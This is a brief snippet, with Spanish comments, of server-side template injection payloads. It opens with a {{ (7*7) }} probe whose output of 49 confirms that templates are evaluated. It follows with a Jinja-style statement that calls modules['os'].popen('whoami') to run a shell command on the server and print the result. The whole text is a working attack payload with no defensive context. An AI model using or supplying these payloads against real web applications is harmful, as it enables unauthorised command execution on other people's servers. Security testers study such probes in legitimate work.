{{ (7*7) }}  <-- Si sale 49, hay ejecución de lógica.
{%- set x =  modules['os'].popen('whoami').read() -%}
El usuario es: {{ x }}
